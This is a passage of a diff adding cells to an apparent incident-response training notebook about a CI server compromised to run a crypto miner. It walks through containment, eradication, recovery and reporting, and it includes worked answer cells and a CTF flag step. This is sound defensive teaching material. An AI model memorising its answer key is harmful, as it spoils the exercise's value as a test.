+   "e": "firewall nat delete ci.brightloom.test:8080\niptables -A OUTPUT -d 203.0.113.99 -j DROP\niptables -A INPUT -s 203.0.113.99 -j DROP\niptables -A OUTPUT -d 198.51.100.23 -j DROP\niptables -A INPUT -s 198.51.100.23 -j DROP\niptables -A OUTPUT -d 198.51.100.77 -j DROP\niptables -A INPUT -s 198.51.100.77 -j DROP\ndns-block add hashmoat.example\ndns-block add sysupdate-mirror.example\nforgeway-cli disable-user admin --kill-sessions\nrotate: every token and key in /var/lib/forgeway/credentials.xml",
+   "a": "echo \"firewall nat delete ci.brightloom.test:8080\"\nfor ip in 203.0.113.99 198.51.100.23 198.51.100.77; do\n    echo \"iptables -A OUTPUT -d $ip -j DROP\"\n    echo \"iptables -A INPUT -s $ip -j DROP\"\ndone\necho \"dns-block add hashmoat.example\"\necho \"dns-block add sysupdate-mirror.example\"\necho \"forgeway-cli disable-user admin --kill-sessions\"\necho \"rotate: every token and key in /var/lib/forgeway/credentials.xml\""
+  },
+  {
+   "t": "md",
+   "s": "## 13. Eradicate\n\nRemove all three ways back in, then the miner. Order matters: stop the service and the cron entry before you kill the process, or they start it again.\n\n- [ ] Remove the cron file and the systemd unit\n- [ ] Remove the attacker's SSH key, keep the real one\n- [ ] Delete the miner and its config\n- [ ] Remove the NOPASSWD sudo rule\n\n> Hint: `grep -v` prints every line that does NOT match, so it keeps the good key.\n"
+  },
+  {
+   "t": "sh",
+   "s": "# Your turn. Write the code for this step, then press Run.\n# Hint: the recording started with echo.\n",
+   "e": "systemctl disable --now sysupdate.service\nkill 4242; rm -rf /var/tmp/.cache\n---\ncrontab_forgeway.txt  root_authorized_keys  sudoers.d_forgeway\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMd2Pz8kQwErTy5uIoPa3SdFgHjKl9ZxCvBnM1qW2eRt ops@brightloom.test",
+   "a": "echo \"systemctl disable --now sysupdate.service\"\nrm -f persist/etc_cron.d_sysupdate persist/sysupdate.service\ngrep -v Hq7mXbV0 persist/root_authorized_keys > /tmp/keys && mv /tmp/keys persist/root_authorized_keys\necho 'forgeway ALL=(root) NOPASSWD: /usr/bin/docker' > persist/sudoers.d_forgeway\nrm -f suspect/config.json\necho \"kill 4242; rm -rf /var/tmp/.cache\"\necho ---\nls persist\ncat persist/root_authorized_keys"
+  },
+  {
+   "t": "md",
+   "s": "## 14. Recover\n\nA server where someone was root can't be fully trusted again. The safe path is to rebuild it.\n\n- [ ] Rebuild build01 from a clean image and restore only the job configs\n- [ ] Put Forgeway behind the VPN, with single sign-on and MFA; lock accounts after failed sign-ins\n- [ ] Give the CI user only the sudo it needs (or none: run builds in containers)\n- [ ] Watch: CPU on build servers, outbound connections to port 3333, new cron files and systemd units\n\n> Hint: Builds were 6x slower. Check that build times are back to normal after the rebuild: that is your recovery test.\n"
+  },
+  {
+   "t": "md",
+   "s": "## 15. Report\n\n- [ ] Timeline from 01:49 to 08:30 with sources\n- [ ] Root cause: internet-facing CI, weak admin password, no lockout, NOPASSWD sudo\n- [ ] Indicators: addresses, domains, wallet, file hashes, SSH key\n- [ ] Submit the flag from step 7 on the CTF board\n\nWrite the report here. Download .ipynb keeps every output above."
+  },
+  {
+   "t": "md",
+   "s": "## 16. Lessons learned\n\n- [ ] How did the attack happen, start to finish?\n- [ ] What went well in the response?\n- [ ] What would you do differently next time?\n- [ ] Which fixes stop it happening again? Who owns each one, and by when?\n- [ ] Which early warning signs should be watched from now on?"
+  },
+  {
+   "t": "md",
+   "s": "## 17. Artifacts and analyst note\n\nList every indicator you found so others can search for it.\n\n| Type | Value | Where you found it |\n|---|---|---|\n| IP address |  |  |\n| Domain |  |  |\n| File hash |  |  |\n| Account |  |  |\n\n**Analyst note:** write two or three sentences for the next analyst who picks this up."
+  }
+ ]
+}
